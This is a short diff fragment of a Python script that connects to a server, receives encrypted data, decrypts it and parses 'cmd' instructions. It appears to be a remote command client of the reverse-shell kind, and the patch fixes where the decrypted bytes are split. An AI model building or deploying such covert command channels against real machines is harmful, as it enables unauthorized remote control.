@@ -30,7 +30,7 @@ def main():
     s.connect((args.server, args.port))
     while True:
         try:
-            received = do_decrypt(s.recv(buff).strip().split())
+            received = do_decrypt(s.recv(buff)).strip().split()
             command = [ str(x, 'utf-8') for x in received ]
             if 'cmd' in command:
                 del command[0]
